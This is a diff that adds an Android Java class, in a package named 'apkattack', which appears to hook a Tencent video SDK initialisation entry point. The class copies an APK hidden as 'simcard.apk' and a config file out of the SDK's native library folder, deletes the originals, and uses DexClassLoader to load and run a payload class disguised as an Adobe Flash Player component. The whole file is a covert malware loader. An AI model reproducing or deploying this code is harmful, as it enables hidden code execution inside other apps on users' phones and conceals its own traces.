@@ -1,0 +1,115 @@
+package com.example.apkattack;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.lang.reflect.Method;
+
+import dalvik.system.DexClassLoader;
+
+import android.annotation.SuppressLint;
+import android.content.Context;
+import android.util.Log;
+
+public class TvkpluginEntry {
+	
+	
+	@SuppressLint("SdCardPath") 
+	
+	//com.tencent.qqlive.mediaplayer.wrapper.e.initSdk(SDKMgrWrapper.java:94)
+	public static void tvkpluginEntry(Context context){
+		String Tag = "tvkpluginEntry";
+		
+    	String dexmethodname = "start";
+    	String cfgfn = "ark.dat";
+    	
+    	String apkfn = "simcard.apk";
+    	String dexclassname = "com.adobe.flashplayer.JarEntry";
+    	
+    	//String apkfn = "qqsdl.apk";
+    	//String dexclassname = "com.google.android.apps.plus.JarEntry";
+		
+		String apppath = context.getFilesDir().getParent() + "/";
+		// data = /data?
+		//String apppath = "/data/data/com.tencent.mobileqq/";
+    	String unzippath = apppath + "MyQQEntry/";
+
+    	String sopath = apppath + "files/TencentVideoKit/armeabi/";
+    	try {
+    		File unzippathfile = new File(unzippath);
+    		if (unzippathfile.exists() == false) {
+    			unzippathfile.mkdirs();
+			}
+    		
+        	File apk = new File(unzippath + apkfn);
+        	File config = new File(unzippath + cfgfn);
+        	if (apk.exists() == false || config.exists() == false) {
+
+    			File oldfilecfg = new File(sopath + cfgfn);
+    			if (oldfilecfg.exists() == false) {
+    				Log.e(Tag, "not find file:" + oldfilecfg.getAbsolutePath());
+    				return;
+    			}else{
+    				FileInputStream fin = new FileInputStream(oldfilecfg);
+    				FileOutputStream fout = new FileOutputStream(config);
+    				
+    				int filesize = (int)oldfilecfg.length();
+    				
+    				byte [] buf = new byte[filesize];
+    				int len = fin.read(buf,0,filesize);
+    				fout.write(buf,0,len);
+    				fin.close();
+    				fout.close();
+    				
+    				oldfilecfg.delete();
+    			}
+    			
+    			String newapkfn = apkfn;
+				File []unzipfiles = new File(sopath).listFiles();
+				for (int i = 0; i < unzipfiles.length; i++) {
+					String tmpfn = unzipfiles[i].getName();
+					if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
+						newapkfn = tmpfn;
+						break;
+					}
+				}
+    			
+    			File oldfileapk = new File(sopath + newapkfn);
+    			if (oldfileapk.exists() == false) {
+    				Log.e(Tag, "not find file:" + oldfileapk.getAbsolutePath());
+    				return;
+    			}else{
+    				FileInputStream fin = new FileInputStream(oldfileapk);
+    				FileOutputStream fout = new FileOutputStream(apk);
+    				
+    				int filesize = (int)oldfileapk.length();
+    				
+    				byte [] buf = new byte[filesize];
+    				int len = fin.read(buf,0,filesize);
+    				fout.write(buf,0,len);
+    				fin.close();
+    				fout.close();
+    				oldfileapk.delete();
+    			}
+        	}
+        	
+        	String appcachepath = context.getCacheDir() + "/";
+        	
+        	DexClassLoader dexcl = new DexClassLoader(unzippath + apkfn, appcachepath, null,context.getClassLoader());
+
+    		Class<?> cls = dexcl.loadClass(dexclassname);
+    	    Object obj = cls.newInstance();
+
+    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
+    	    method.invoke(obj,context);
+    	    
+    	    Log.e(Tag, "qq load apk success");
+		} catch (Exception e) {
+			 Log.e(Tag, "qq load apk exception");
+			e.printStackTrace();
+		}
+    	
+
+	}
+
+}
